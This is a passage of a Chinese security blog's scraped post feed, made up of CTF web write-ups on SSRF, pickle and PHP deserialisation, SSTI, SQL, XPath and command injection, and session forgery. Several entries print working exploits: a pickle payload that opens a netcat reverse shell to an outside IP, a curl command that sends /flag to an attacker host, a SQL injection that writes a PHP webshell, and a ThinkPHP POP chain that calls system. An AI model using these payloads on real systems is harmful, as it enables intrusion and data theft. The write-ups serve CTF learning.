&#39;/template/&#39;+ action +&#39;.pug&#39;); var html = pug.renderFile(file); res.send(html); }); app.post(&#39;/file_upload&#39;, function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: &#39;&#39;, } if (!ip.includes(&#39;127.0.0.1&#39;)) { obj.msg=&quot;only admin&#39;s ip can use it&quot; res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = &#39;upload failed&#39;; res.send(JSON.stringify(obj)); }else{ var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = &quot;file type error&quot;; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: &#39;upload success&#39;, filename: file_path + file_name } } catch (error) { obj.msg = &#39;upload failed&#39;; } res.send(JSON.stringify(obj)); } }) }) app.get(&#39;/source&#39;, function(req, res) { res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); }); app.get(&#39;/core&#39;, function(req, res) { var q = req.query.q; var resp = &quot;&quot;; if (q) { var url = &#39;http://localhost:8081/source?&#39; + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;); } else { try { http.get(url, function(resp) { resp.setEncoding(&#39;utf8&#39;); resp.on(&#39;error&#39;, function(err) { if (err.code === &quot;ECONNRESET&quot;) { console.log(&quot;Timeout occurs&quot;); return; } }); resp.on(&#39;data&#39;, function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on(&#39;error&#39;, (e) =&gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(&quot;search param &#39;q&#39; missing!&quot;); } }) function blacklist(url) { var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } } } var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) }) 上传功能要求ip为127.0.0.1，remoteaddress无法伪造，所以估计是ssrf。文件路径中有mimetype，这是可控的，所以存在目录穿越。接下来就是怎么利用的问题了。由于nodejs没怎么接触过 解释不清楚 就贴几个师傅的链接了：https://www.zhaoj.in/read-6462.htmlhttps://www.jianshu.com/p/504621863fa3https://guokeya.github.io/post/hz6_KR03h/https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game 还有个+号拼接的我觉得最容易想到吧：https://blog.csdn.net/qq_42181428/article/details/104474414以及出题人wp里那个奇怪url编码的原理：https://xz.aliyun.com/t/2894 上面四个师傅讲的很清楚。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Python pickle 反序列化分析","slug":"Python-pickle-反序列化分析","date":"2020-11-24T13:56:36.000Z","updated":"2020-11-24T15:53:27.527Z","comments":true,"path":"2020/11/24/Python-pickle-反序列化分析/","link":"","permalink":"/2020/11/24/Python-pickle-反序列化分析/","excerpt":"","text":"buu上遇到个python pickle反序列化的题，顺便学习一下有关知识。 python反序列化简介与利用 相较于php的反序列化，python的反序列化更容易利用，危害也更大。在php的反序列化漏洞利用中我们必须挖掘复杂的利用链，但python的序列化和反序列化中却不需要那么麻烦，因为python序列化出来的是pickle流，这是一种栈语言，python能够实现的功能它也能实现，引用一下pickle的简介： pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好,之后就以pickle库来进行演示。 先通过几个例子来看下这几个函数的作用： dump/load #序列化pickle.dump(obj, file, protocol=None,)obj表示要进行封装的对象(必填参数）file表示obj要写入的文件对象以二进制可写模式打开即wb(必填参数） #反序列化pickle.load(file, *, fix_imports=True, encoding=”ASCII”, errors=”strict”, buffers=None)file文件中读取封存后的对象以二进制可读模式打开即rb(必填参数) dumps/loads #序列化pickle.dumps(obj, protocol=None,*,fix_imports=True)dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。 #反序列化pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”)loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。 python2 在python下输出如下：b’\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.’python2序列化输出的字符串可以放在python3里正常反序列化，但python3序列化输出的字符串却不能让python2反序列化。 不同pickle版本的操作码及其含义可以在python3的安装目录里搜索pickle.py查看，如下是一部分操作码： 对于上面python上的结果进行分析b’\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.’： 第一个字符\\x80是一个操作码，pickle.py文件中的注释说明它的含义是用来声明pickle版本，后面跟着的\\x03就代表了版本3；随后的X表示后面的四个字节代表了一个数字（小端序），即\\x04\\x00\\x00\\x00,值为4，表示下面跟着的utf8编码的字符串的长度，即后面跟着的abcd;再往后是q,这个没有查到详细的说明，看注释上的字面意思是后面即\\x00是一个字节的参数，但也不知道这个有什么用，我猜测它是用来给参数做索引用的，索引存储在momo区，如果不需要用到取数据，可以把q\\x00删掉，这并不影响反序列化，最后的.代表结束，这是每个pickle流末尾都会有的操作符。 来看看复杂类型的数据序列化后是什么样的： a=(&quot;item1&quot;,&quot;item2&quot;) b=[&quot;item1&quot;,&quot;item2&quot;] c={&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;} print(pickle.dumps(a)) print(pickle.dumps(b)) print(pickle.dumps(c)) 结果： b&#39;\\x80\\x03X\\x05\\x00\\x00\\x00item1q\\x00X\\x05\\x00\\x00\\x00item2q\\x01\\x86q\\x02.&#39; b&#39;\\x80\\x03]q\\x00(X\\x05\\x00\\x00\\x00item1q\\x01X\\x05\\x00\\x00\\x00item2q\\x02e.&#39; b&#39;\\x80\\x03}q\\x00(X\\x04\\x00\\x00\\x00key1q\\x01X\\x06\\x00\\x00\\x00value1q\\x02X\\x04\\x00\\x00\\x00key2q\\x03X\\x06\\x00\\x00\\x00value2q\\x04u.&#39; 先来看tuple的pickle流，在栈上连续定义了两个字符串最后在结尾加了\\x86这个操作码，其含义为”利用栈顶的两个元素（即前面的item1和item2）建立一个元组”，后面的q\\x02标识该元组在memo的索引，最后是.结束符。 再看list的pickle流，在版本声明的后面是一个]操作符，意思是在栈上建立一个空list，q\\x00是这个列表在memo的索引，后面是一个(,这是一个很重要的操作符，它用来标记后面某个操作的参数的边界，在这里其实是用来告诉末尾的e（建立list的操作符），从(开始到e操作符前面的内容用来构建list，(标记前面的内容就不归e操作符管了。最后是.结束符。 最后来看dict的pickle流，在版本声明的后面是一个},表示在栈上建立一个空dict，q\\x00表明了这个dict在memo区的索引，后面同样是(标记,后面按照先key后value的属性依次定义数据，并给每个数据定好memo区的索引，最后是u操作符，类似于上面的e操作符，它的含义为利用(标记到u之间的数据构建dict，最后是.操作符。 上面是python3情况下的分析，遇到python2的题可看此链接：https://www.freebuf.com/articles/web/252189.html或者直接看此图： 整个序列化的过程可以分为三个步骤 从对象中提权所有属性写入对象的所有模块名和类名写入对象所有属性的键值对 反序列化的过程就是序列化过程的逆过程。 #Pickle/CPickle反序列化漏洞分析 反序列化漏洞出现在 reduce()魔法函数上，这一点和PHP中的__wakeup()魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。 而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞. 另外pickle.loads会解决import问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。 #漏洞可能出现的位置： 解析认证token、session的时候将对象Pickle后存储成磁盘文件将对象Pickle后在网络中传输参数传递给程序 命令执行的例子： 好了 下面开始解题 [watevrCTF-2019]Pickle Store cookie里看到奇怪代码，使用pickle.loads()和base64对这串字符进行解码反序列化 经过上面的学习，现在可谓是轻车熟路 import pickle import base64 print(pickle.loads(base64.b64decode(&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;))) 利用Pickle反序列化exp反弹shell import pickle import base64 class A(object): def __reduce__(self): return (eval, (&quot;__import__(&#39;os&#39;).system(&#39;nc 172.16.151.7 9999 -e/bin/sh&#39;)&quot;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 参考链接：https://www.secshi.com/39791.htmlhttps://www.freebuf.com/articles/web/252189.htmlhttps://www.anquanke.com/post/id/188981","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"HECTF2020-Web","slug":"HECTF2020-Web","date":"2020-11-23T13:31:22.000Z","updated":"2020-11-23T13:46:25.592Z","comments":true,"path":"2020/11/23/HECTF2020-Web/","link":"","permalink":"/2020/11/23/HECTF2020-Web/","excerpt":"","text":"HECTF比较简单，和隔壁NCTF简直天差地别。。。不过人家这是新生赛。先说下成绩，最高18名，还有半天的时间，继续c的话肯定能进线下，前十都有可能。但是想了想，进线下第一没时间第二没钱第三学校不认证书第四觉得自己硬实力不够。然后就放了没打，最后也是二十多名，前三十要交的wp也懒得交了，我就在这写一写Web的吧。 一、签到 hint.php提示爆破，但显然，直接爆破密码是没脑子的行为。爆破点在忘记密码里面的验证码，爆出来是0233改密码登录即可。 二、ezphp 阿这，这md5我都懒得写了。。。脚本跑个md5值是0e开头但后面包含c的数字就行。 三、ssrfme 第九届极客大挑战原题 四、injectionXPATH盲注，啥都没过滤，也是右手就行脚本： import requests url = &quot;http://114.55.165.246:8082?username=&#39;or substring((//user[position()=1]/ password[position()=1]),28,1)=&#39;{}&#39; or &#39;&#39;=&#39;&amp;password=10&amp;submit=%E7%99%BB%E5%BD%95&quot; for i in range(30,128): url1=url.format(chr(i)) a = requests.get(url=url1) print(a.text) if &quot;登录成功you login as admin but username not admin&quot; in a.text: print(i) print(url1) break 下面还有个时间盲注永奇学长做出来了，我当时已经放了就没看，总之题比较简单，也没有很想c的欲望。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"NCTF2020签到摸鱼","slug":"NCTF2020签到摸鱼","date":"2020-11-23T13:04:41.000Z","updated":"2020-11-23T13:29:18.975Z","comments":true,"path":"2020/11/23/NCTF2020签到摸鱼/","link":"","permalink":"/2020/11/23/NCTF2020签到摸鱼/","excerpt":"","text":"NCTF的难度以现在的水平还是太勉强了，只有这个签到是个正常题，别的基本都是取自真实渗透过程，或许明年才能够打出成绩。 Web签到-你就是我的master吗 有一说一这签到题虽然比较简单，但是居然也只有五十个解。 题目环境关了，靠印象描述一下吧。总之就是非常可爱，啊不对，总之就是有个name参数，传啥返回啥，那就是ssti了。一开始想着签到题怎么可能难呢，直接找了个库存ssti payload，结果被出题人无情嘲讽了一波~既然有黑名单，那就先fuzz一波，然后在制定绕过的方案。 官方wp给出了blacklist：blacklist = [‘%’,’-‘,’:’,’+’,’class’,’base’,’mro’,’_’,’config’,’args’,’init’,’global’,’.’,’\\’’,’req’,’|’,’attr’,’get’]值得一提的是在比赛的时候加号并没有被过滤，但是这影响并不大。我们需要构造的语句是： 1、单引号的绕过：全部用双引号代替。2、下划线的绕过：16进制绕过，\\x5f\\x5f3、calss、global等函数：用加号拼接（也可全部用16进制绕过）4、.的绕过：用方括号绕过 最终payload： 好了，NCTF2020之旅结束。看着剩下的那些神仙题，发现自己不会的、不清楚的地方还是太多了，不多说了，好好学习。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[RCTF 2019]Nextphp","slug":"RCTF-2019-Nextphp","date":"2020-11-20T07:17:10.000Z","updated":"2020-11-20T16:15:13.954Z","comments":true,"path":"2020/11/20/RCTF-2019-Nextphp/","link":"","permalink":"/2020/11/20/RCTF-2019-Nextphp/","excerpt":"","text":"代码过于简单，肯定不对劲。可以查看phpinfo，看到disable_function里面几乎过滤了所有执行函数。 写马蚁剑也连不上。 ?a=var_dump(scandir(“/var/www/html/“));查看目录：array(4) { [0]=&gt; string(1) “.” [1]=&gt; string(2) “..” [2]=&gt; string(9) “index.php” [3]=&gt; string(11) “preload.php” } ?a=show_source(‘preload.php’);查看preload.php源码： 然而这个反序列化我并不知道怎么利用，没有魔法函数也没有执行函数。 知识点：preload/FFI同时使用导致绕过disable_function/open_basedir文档：https://wiki.php.net/rfc/preloadhttps://www.php.net/manual/en/ffi.examples-basic.php尝试看了下，然后放弃了，原理暂时不去搞清楚，记住这个知识点就行。题目中设置了opcache.preload = /var/www/html/preload.php和FFI support = enabled，可以利用ffi直接调用C语言编写的函数 那再看上面的代码，利用点应该就是将代码写入data里面。 exp： &lt;?phpfinal class A implements Serializable { protected $data = [ ‘ret’ =&gt; null, ‘func’ =&gt; ‘FFI::cdef’, ‘arg’ =&gt; ‘int system(const char *command);’ //声明 ]; public function serialize (): string { return serialize($this-&gt;data); } public function unserialize($payload) { $this-&gt;data = unserialize($payload); } } $a = new A();$b = serialize($a);echo $b; 结果：C:1:”A”:95:{a:3:{s:3:”ret”;N;s:4:”func”;s:9:”FFI::cdef”;s:3:”arg”;s:32:”int system(const char *command);”;}} 上述代码实现声明FFI::cdef(“int system(const char *command);”) 所以现在只需调用即可，通过设置__serialize()[‘ret’]的值获取flag __serialize()[‘ret’]-&gt;system(‘curl -d @/flag linux靶机的ip’) 完整paylaod:?a=$a=unserialize(‘C:1:”A”:95:{a:3:{s:3:”ret”;N;s:4:”func”;s:9:”FFI::cdef”;s:3:”arg”;s:32:”int system(const char *command);”;}}’)-&gt;__serialize()[‘ret’]-&gt;system(‘curl -d @/flag 172.16.191.146:8888’); 传参后完整过程：1.unserialize把payload传给data参数,即覆盖原参数 2.runret=FFI::cdef(‘int system(const char *command);’) 3.__serialize()指定的ret内容即是最终的执行命令，通过最后的return调用，返回flag。 参考：https://www.cnblogs.com/karsa/p/13393034.html","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[SUCTF 2018]MultiSQL","slug":"SUCTF-2018-MultiSQL","date":"2020-11-18T14:27:00.000Z","updated":"2020-11-18T14:29:29.777Z","comments":true,"path":"2020/11/18/SUCTF-2018-MultiSQL/","link":"","permalink":"/2020/11/18/SUCTF-2018-MultiSQL/","excerpt":"","text":"[SUCTF 2018]MultiSQL 注册登陆界面似乎并不存在sql注入，上面留言板啥的都是摆设，然后试了下编辑信息那里的一个头像上传，没法解析，所以也不行。最后发现一个可疑的注入点，user.php?id=3，还是在个人信息那里，首先试了下1^1^1,成功返回admin。简单测试发现过滤了union，select ，&amp;，|，substr。存在堆叠注入，用chrar()绕过过滤，再用预处理语句执行。 str=”select ‘&lt;?php eval($POST[]);?&gt;’ into outfile ‘/var/www/html/favicon/shell.php’;”len_str=len(str)for i in range(0,len_str): if i == 0: print(‘char(%s’%ord(str[i]),end=””) else: print(‘,%s’%ord(str[i]),end=””)print(‘)’) ?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"UNCTF2020复现","slug":"UNCTF2020复现","date":"2020-11-17T14:48:48.000Z","updated":"2020-11-17T14:54:51.525Z","comments":true,"path":"2020/11/17/UNCTF2020复现/","link":"","permalink":"/2020/11/17/UNCTF2020复现/","excerpt":"","text":"这比赛没报上名，借的别人的号看了看觉得题挺不错的，结束以后正好官方给了复现环境，打打基础准备接下来的NCTF和HECTF。 一、easy_ssrf payload：url=/unctf.com/../flag 考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRFphp源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。 FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。https://www.runoob.com/php/filter-validate-url.html 题目中要求url中存在 unctf.com我们可以构造类似 unctf.com/../ 这样的url，又因为我们需要查看flag文件 最终payload为 url=unctf.com/../flag 二、UN’s_online_tools ping命令执行的绕过，就那么几样东西。首先127.0.0.1||ls看到目录下的index.php和style.csscat index.php显示非法字符127.0.0.1|ca\\t&lt;index.php成功绕过看到源码： payload：url=127.0.0.1|ta\\c%09../../../fla%3F 三、babyeval 过滤了括号，以及返回的内容中不能含有flag a=include “php://filter/read=convert.base64-encode/resource=flag.php”; 四、ezfind http://2b4e0d94-c2fd-4aa6-ba2c-af5528e74031.node1.hackingfor.fun/index.php?name[]=1 随便传个数组就绕过了，不知道咋回事，应该是非预期。等wp出来看看预期解。 五、easyunserialize 明显的反序列化+字符串逃逸最基础的payload：#1=challengechallengechallengechallengechallengechallengechallengechallenge”;s:8:”password”;i:1;}”;s:8:”password”;s:4:”easy”;}aaa 六、ezphp payload：data=a:2:{s:8:”username”;b:1;s:8:”password”;b:1;} 这个上来乍一看直接让username=admin，password=password就行。但一波操作之后发现不行。仔细研究发现如果是username数据类型是a的话$data_unserialzie[‘username’]的值是不存在的，这里我也不是很清楚。去网上找了下数据类型 bool类型的true跟任意字符串可以弱类型相等，即得出上面的payload。 七、easyflask 提示要以admin登录由于题目是flask直接找到/register和/login注册登录居然直接成功，然后在首页看到了这个 访问提示you should ‘guess’ the secret number 尝试：/secret_route_you_do_not_know?guess=49 返回49 error!!存在ssti拿了个库存的paylaod打算一把梭，然后发现有黑名单，单引号、下划线、方括号。都是常见的绕过，也没什么难的，稍微改改就行。[]可以用getitem()： __ 和 “(引号)可以用|attr绕过，例： 八、easy_upload perl|pyth|ph|auto|curl|base||&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents! 可以传htaccess，由于过滤了php，换行绕过即可。 到此最基础的送分题应该是做完了，收获还是很大的，对我目前最弱的php的一些基础有了很大的提升（本地试了好多payload），同时复习了一遍各种绕过。最后感谢一下UNCTF的师傅们赛后还提供了复现环境。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[HarekazeCTF2019]Easy Notes","slug":"HarekazeCTF2019-Easy-Notes","date":"2020-11-07T13:15:21.000Z","updated":"2020-11-07T16:11:32.212Z","comments":true,"path":"2020/11/07/HarekazeCTF2019-Easy-Notes/","link":"","permalink":"/2020/11/07/HarekazeCTF2019-Easy-Notes/","excerpt":"","text":"这题一开始百思不得其解，我就感觉这题没有源码做不了，但是也扫不出泄露的源码。结果发现buu直接给出了源码。。。 首先查看flag.php is_admin()为true时，输出flag。 在lib.php里面找到了is_admin()的定义： 由下图可知文件名是可控的： 只要让用户名为sess_，type为.. ，就能创建一个session文件。那么接下来就是看如何控制文件内容。 在伪造了这个session文件之后，就会向这个文件写入note的title，所以让title等于|N;admin|b:1;即可。|N;用来闭合杂乱数据。xxxx|N;admin|b:1;xxxxxx。 解题： 首先以sess_为登录名登录，接着上传title为|N;admin|b:1;，body随意的笔记。然后访问export.php?type=. 得到令session admin为true的paylaod。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[安洵杯 2019]iamthinking","slug":"安洵杯-2019-iamthinking","date":"2020-11-06T13:17:56.000Z","updated":"2020-11-06T16:03:13.953Z","comments":true,"path":"2020/11/06/安洵杯-2019-iamthinking/","link":"","permalink":"/2020/11/06/安洵杯-2019-iamthinking/","excerpt":"","text":"www.zip源码泄露 全局搜索serialize Index.php payload参数可控，接下来就是寻找反序列化的点了。 全局搜索destruct。 前面几个都无法利用，所以只能看Model.phppublic function __destruct(){ if ($this-&gt;lazySave) { $this-&gt;save(); }} 其中lazysave没啥用，根据上面代码得知其默认值为false。跟进save 需要满足isempty()的值为false，trigger(‘BeforeWrite’)的值为true跟进isEmpty：public function isEmpty(): bool{ return empty($this-&gt;data);}所以data变量需不存在。 跟进trigger在model.php里面没有找到trigger的定义，于是全局搜索trigger。搜出来一堆但貌似也没有我要找的定义，卡住，看了wp。 看了wp找到了。。。慢慢找还是能找到的。（爷是懒狗 让$this-&gt;withEvent为flase即可。 继续看上面的save() result需为true这个exists好像默认值也是true？那么只要updateData()返回true就行。 跟进updataData 然后这里又卡了，这一长串也不知道哪里是切入点。根据wp提示，继续跟进checkAllowFields。。。 发现文字拼接：$this-&gt;table . $this-&gt;suffix能够被利用触发toString方法。 进入到这一步的条件就是： $this-&gt;field为空，且$this-&gt;schema也为空。即: $this-&gt;field = []; $this-&gt;schema = []; 同时这里还有一个判断，即$this-&gt;table，当为true是才能执行字符串的拼接。所以为了能让这个方法被调用到，我们要让exists存在。即 $this-&gt;exists =True 关于toString魔术方法,他是在Conversion.php当中。 public function __toString(){ return $this-&gt;toJson();} 继续查看tojson这个函数： public function toJson(int $options = JSON_UNESCAPED_UNICODE): string{ return json_encode($this-&gt;toArray(), $options);} 跟进到toArray方法。 elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key);}elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key);} 再看到getAttr方法： public function getAttr(string $name){ try { $relation = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $relation = $this-&gt;isRelationAttr($name); $value = null; } return $this-&gt;getValue($name, $value, $relation); } 跟进getData方法： if (is_null($name)) { return $this-&gt;data; } $fieldName = $this-&gt;getRealFieldName($name); 进入到getRealFieldName方法： protected function getRealFieldName(string $name): string { return $this-&gt;strict ? $name : Str::snake($name); } if (array_key_exists($fieldName, $this-&gt;data)) { return $this-&gt;data[$fieldName]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; }如果$this-&gt;strict为True，返回$name。 此时再getData方法中： $this-&gt;data[$fielName] = $this-&gt;data[$key] 此时再getAttr中就是： $this-&gt;getValue($key, $value, null); 跟进getvalue：protected function getValue(string $name, $value, $relation = false){ // 检测属性获取器 $fieldName = $this-&gt;getRealFieldName($name); $method = ‘get’ . Str::studly($name) . ‘Attr’; if (isset($this-&gt;withAttr[$fieldName])) { if ($relation) { $value = $this-&gt;getRelationValue($relation); } if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])) { $value = $this-&gt;getJsonValue($fieldName, $value); }else { //$fieldName = a //withAttr[a] = system $closure = $this-&gt;withAttr[$fieldName]; //value = system(ls,) $value = $closure($value, $this-&gt;data); } 可以很明显看到： 当$this-&gt;withAttr[$key]不为数组条件就会为false，从而触发命令执行 其实这题思路一点不难，就是这exp的格式之前没见过。 今天来不及细想了，后面一段都是复制的，以后有时间了再看看。payload:http://532a6c9f-d826-411b-a479-02b9cc0e1b70.node3.buuoj.cn////public/?payload=O%3A17%3A%22think\\model\\Pivot%22%3A6%3A{s%3A21%3A%22%00think\\Model%00lazySave%22%3Bb%3A1%3Bs%3A8%3A%22%00*%00table%22%3BO%3A17%3A%22think\\model\\Pivot%22%3A6%3A{s%3A21%3A%22%00think\\Model%00lazySave%22%3Bb%3A1%3Bs%3A8%3A%22%00*%00table%22%3Bs%3A0%3A%22%22%3Bs%3A10%3A%22%00*%00visible%22%3Ba%3A1%3A{i%3A0%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}}s%3A21%3A%22%00think\\Model%00relation%22%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}s%3A17%3A%22%00think\\Model%00data%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B}s%3A21%3A%22%00think\\Model%00withAttr%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3B}}s%3A10%3A%22%00*%00visible%22%3Ba%3A1%3A{i%3A0%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}}s%3A21%3A%22%00think\\Model%00relation%22%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}s%3A17%3A%22%00think\\Model%00data%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B}s%3A21%3A%22%00think\\Model%00withAttr%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3B}}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[NPUCTF2020]ezlogin","slug":"NPUCTF2020-ezlogin","date":"2020-11-04T05:03:50.000Z","updated":"2020-11-06T16:11:07.863Z","comments":true,"path":"2020/11/04/NPUCTF2020-ezlogin/","link":"","permalink":"/2020/11/04/NPUCTF2020-ezlogin/","excerpt":"","text":"一个登陆界面，没有扫到任何东西。session每隔几秒就会失效，每次登录只能使用一次。否则就会显示超时。 尝试万能密码但是没用。 这里要用到XPath注入：https://xz.aliyun.com/t/7791https://www.cnblogs.com/backlion/p/8554749.htmlXPath 即为 XML 路径语言，是 W3C XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。XPath 基于 XML 的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力，可用来在 XML 文档中对元素和属性进行遍历。XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。XPath是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言,后来独立成了一种W3C标准。 本来想细写一下的又被buu气到了。。。buu的429让很多脚本都失效了 搞了半天一直报错心态都崩了 说什么数组超出范围？ 加了个时间函数搞定。 XPathpayload 上面链接都有。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[HFCTF2020]BabyUpload","slug":"HFCTF2020-BabyUpload","date":"2020-10-30T05:40:11.000Z","updated":"2020-10-30T16:11:55.350Z","comments":true,"path":"2020/10/30/HFCTF2020-BabyUpload/","link":"","permalink":"/2020/10/30/HFCTF2020-BabyUpload/","excerpt":"","text":"源码 首先分析输出flag的条件，只要filename符合条件且存在，那么就会输出flag。 两个post参数。attr拼接成为dirpath，direction的值分为upload和download。当direction为upload时，首先判断文件是否能正常上传，然后拼接文件名，接着对文件名进行sha256加密。还限制了目录穿越，创建新目录并将文件上传至该目录下。当direction为download时，和上面差的不多。 总结一下可知我们获取flag需要两个条件。一是session username为admin。二是创建一个success.txt文件。 首先burp抓包查看一下我的phpsessid 首先尝试传入：direction=download&amp;attr=&amp;filename=sess_ab3979c79b41963162a6a63cbf0931c4 回显我的username是guest。至于如何伪造成admin就无从而知了。查看wp得知他们看到burp上有个不可见字符从而想打破不同引擎对应着不同session的存储方式。但是我的burp没有乱码。。。 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php:存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 有不可见字符的话 那就能说明我那里为啥是空白的了 很显然是php_binary ascii码中有不可见字符。那么我们可以在本地利用php_binary生成我们要伪造的session文件。 //&lt;?phpini_set(‘session.serialize_handler’, ‘php_binary’);session_save_path(“E:\\phpstudy_pro\\WWW\\“);session_start(); $_SESSION[‘username’] = ‘admin’; 生成之后查看sha256加密后的文件名 432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4 接下来就是上传文件 然后验证一下是否上传成功 direction=download&amp;attr=&amp;filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4 得到正确回显： usernames:5:”admin”; 这样就实现了伪造 接下来创建success.txt然后出发读flag机制即可。flag{8fa47d71-db92-449e-b24f-1bb93820bbd5}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[EIS 